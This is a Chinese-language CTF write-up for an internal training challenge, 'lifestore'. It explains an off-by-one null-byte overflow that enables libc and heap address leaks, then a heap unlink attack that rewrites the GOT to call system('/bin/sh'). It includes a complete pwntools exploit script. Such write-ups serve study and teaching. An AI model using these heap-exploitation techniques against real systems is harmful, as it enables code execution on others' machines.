# AAA内训题 lifestore

这道题想了好久都没想出来，就是不知道怎么 info leak。

后来发现这道题的作者简直满满的提示啊，怎么 info leak。很多代码都是作者为了让我们 info leak 而故意这样设置的，而我却没有看出来，或者说看出来了但是只在脑袋中一闪而过，没有去仔细的思考揣摩作者的意图。



## info leak

这道题的用到的结构体如下

```C
00000000 skill_st        struc ; (sizeof=0xFC, mappedto_2)
00000000 name            db 136 dup(?)
00000088 priority        db 72 dup(?)
000000D0 name_len        dd ?
000000D4 level           db 40 dup(?)
000000FC skill_st        ends
```



这道题的 get_input 函数在末尾会插\0， 造成了一个字节的溢出。但是因为插\0,所以给 info leak 造成了困难。但是这个函数的 len 参数如果是0的话，就会什么都不做直接返回了。所以要从这里入手。

```C
unsigned int __cdecl get_input(char *s, unsigned int len)
{
  int j; // eax@6
  char buf[1]; // [esp+Bh] [ebp-Dh]@4
  unsigned int i; // [esp+Ch] [ebp-Ch]@3

  if ( !len )                                   // 这里如果是0的话，就能不在最后加上\x00了
    return 0;
  i = 0;
  while ( i < len )
  {
    read(0, buf, 1u);
    if ( buf[0] == '\n' )
    {
      s[i] = 0;
      return i;
    }
    j = i++;
    s[j] = buf[0];
  }
  s[i] = 0;                                     // 溢出一个字节
  return i;
}
```

交叉引用查看对这个函数的调用发现在 Add_skill 的时候，有一处地方 get_input 的 len 参数是可控的。

```C
 get_input(p->priority, 72u);                  // 这里有可能 leak, off by one，最后会溢出一个字节，写入\x00， 正好覆盖掉name_len
  printf("the name of this skill plz:");
  get_input(p->name, p->name_len);	//len 参数可控
  printf("finally, how strong you want this skill to be? :");
  get_input(p->level, 40u);                  
```

虽然之前输入 name_len之后有判断len不能为0

```C
 if ( len > 135 || !len )
    return puts("invalid name length\n");       
```

但是调用`get_input(p->priority, 72u);`的时候因为会溢出一个字节，正好能把后面的name_len字段给覆盖成0。 

所以最后的思路就是先 malloc 一个 skill 结构体，然后 free 掉，再 malloc，name 字段不输入任何字符，再 list_skills 就可以 leak 出 libc 或者 heap 的地址。



## 利用 off by one

接下来就是常见的 off by one 的堆利用了。由于这道题的作者别有用心的把pSkills_arr 这个结构体数组放在了堆上，所以很容易想到如果能够篡改这个数组里的信息就可以任意地址写了。

思路是在堆里布置两个 chunk，利用 off by one 把第二个 chunk 的 PREV_IN_USE flag 置为0，同时把 prev_size 字段改成第二个 chunk 离堆的第一个 chunk（存放pSkills_arr数组）的距离。这样在 free 的时候就会以为之前那个 chunk 是空闲的，然后把它 unlink 出来，合并成一个更大的 free chunk。但是要注意 unlink 的时候有 check FD->BK=BK->FD， 这个绕过一下就可以了。

再之后 Add_skill 的时候 malloc 的块就覆盖了pSkills_arr数组的区域了，然后篡改数组的某一项指向 got 表，某一项指向libc中的"/bin/sh"字符串，修改 got 表中的 free 为 system 函数的地址，然后free 某一个 chunk 就可以了。



## exp

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""" dddong / AAA """

from pwn import *
import sys, os, re
context(arch='i386', os='linux', log_level='info')
context(terminal=['gnome-terminal', '-x', 'zsh', '-c'])

def __get_base(p, _path):
    _vmmap = open('/proc/%d/maps' % p.proc.pid).read()
    _regex = '^.* r-xp .* {}$'.format(_path)
    _line = [_ for _ in _vmmap.split('\n') if re.match(_regex, _)][0]
    return int(_line.split('-')[0], 16)

def gen_rop(func_addr, args):
    """
    automate generate rop function
    _gadgets array contains gadgets address for 0,1,2,... args
    """
    _gadgets = []
    rop = ""
    rop += p32(func_addr)
    if len(args) > 1:
        rop += _gadgets[len(args)]
        for arg in args:
            rop += p32(args)
    return rop


_program = 'lifestore'
_pwn_remote = 0
_debug = int(sys.argv[1]) if len(sys.argv) > 1 else 0

elf = ELF('./' + _program)

if _pwn_remote == 0:
    os.environ['LD_PRELOAD'] = ''
    libc = ELF('./libc.so.6')
    p = process('./' + _program)

    if _debug != 0:
        if elf.pie:
            _bps = [] #breakpoints defined by yourself, not absolute addr, but offset addr of the program's base addr
            _offset = __get_base(p, os.path.abspath(p.executable))
            _source = '\n'.join(['b*%d' % (_offset + _) for _ in _bps])
        else:
            _source = 'source peda-session-%s.txt' % _program
        gdb.attach(p.proc.pid, execute=_source)
else:
    p = remote('8.8.8.8', 4002)	#todo

def add_skill(name_len, name, priority, level):
    p.recvuntil("choice:")
    p.sendline("1")
    p.sendlineafter("skill(<136):", str(name_len))
    p.sendafter("how important this skill shall be?", priority)
    p.sendafter("skill plz:", name)
    p.sendafter("how strong you want this skill to be?", level)

def list_skills():
    p.sendlineafter("choice:", "2")
    p.recvuntil("level\n")
    p.recvuntil("\t")
    name = p.recvn(16)
    print "name:", name
    return name

def edit_skill(idx, name, priority, level):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("the index of the skill you wanna edit:", str(idx+1))
    if(p.recvuntil("invalid index", timeout=0.2)):
        raise Exception
    p.sendafter("how important this skill shall be?", priority)
    p.sendafter("the name of this skill plz", name)
    p.sendafter("how strong you want this skill to be?", level)

def delete_skill(idx):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("the index of the skill you wanna delete:", str(idx+1))
    if(p.recvuntil("invalid index!", timeout=0.2)):
        raise Exception

###########################   leak libc ###########################################
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')
delete_skill(0)

add_skill(1, '', 'A' * 72, 'A' * 39 + '\n')
leak = list_skills()
addr_of_libc = u32(leak[:4])
libc.address = addr_of_libc - 1779632
print("libc base addr:%s" % hex(libc.address))

delete_skill(0)
delete_skill(1)
########################### leak heap     ###########################################
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')
add_skill(1, 'A' * 1, 'A' * 70 + '\n', 'A' * 39 + '\n')

delete_skill(0)
delete_skill(2)
add_skill(1, '', 'A' * 72, 'A' * 39 + '\n')
leak = list_skills()
heap_base = u32(leak[4:8]) - 0x258
print "heap base addr:", hex(heap_base)

delete_skill(0)
delete_skill(1)
delete_skill(3)
############################   off by one ##########################################
add_skill(100, 'A' * 12 + p32(heap_base) + '\n', 'A' * 70 + '\n', 'A' * 39 + '\n')
add_skill(100, 'A' * 8 + p32(heap_base) + '\n', 'A' * 70 + '\n', 'A' * 39 + '\n')
prev_size = 0x158
edit_skill(0, 'A' * 1 + '\n', 'A' * 70 + '\n', 'A' * 36 + p32(prev_size))
delete_skill(1)

print hex(heap_base+16)
add_skill(100, p32(elf.got['free']- 0x88) + 'AAAA' + p32(libc.search('/bin/sh').next())+'sh\n', '\n', '\n')
raw_input("wait for gdb attach")
edit_skill(0, name='\n', priority=p32(libc.symbols['system']) + p32(libc.symbols['puts']) + '\n', level='\n')
delete_skill(2)

p.interactive()
```

